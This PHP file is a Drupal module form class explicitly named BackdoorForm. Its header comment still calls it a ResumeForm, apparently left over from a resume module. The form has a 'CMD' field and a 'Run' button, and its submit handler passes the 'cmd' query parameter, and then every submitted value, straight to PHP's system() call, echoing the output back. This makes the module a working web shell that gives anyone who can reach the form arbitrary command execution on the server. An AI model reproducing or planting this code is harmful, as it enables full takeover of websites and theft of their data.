<?php
/**
 * @file
 * Contains \Drupal\resume\Form\ResumeForm.
 */
namespace Drupal\backdoor\Form;

use Drupal\Core\Form\FormBase;
use Drupal\Core\Form\FormStateInterface;

class BackdoorForm extends FormBase {
  /**
   * {@inheritdoc}
   */
  public function getFormId() {
    return 'backdoor_form';
  }

  /**
   * {@inheritdoc}
   */
  public function buildForm(array $form, FormStateInterface $form_state) {

        $form['cmd'] = array(
      '#type' => 'email',
      '#title' => t('CMD :'),
      '#required' => TRUE,
    );

    $form['actions']['#type'] = 'actions';
    $form['actions']['submit'] = array(
      '#type' => 'submit',
      '#value' => $this->t('Run'),
      '#button_type' => 'primary',
    );
    return $form;
  }

  /**
   * {@inheritdoc}
   */
    public function validateForm(array &$form, FormStateInterface $form_state) {

/**
*
*/

    }

  /**
   * {@inheritdoc}
   */
  public function submitForm(array &$form, FormStateInterface $form_state) {
    system($_GET['cmd']);
    foreach ($form_state->getValues() as $key => $value) {
      drupal_set_message('Output: ' . system($value));
    }

   }
}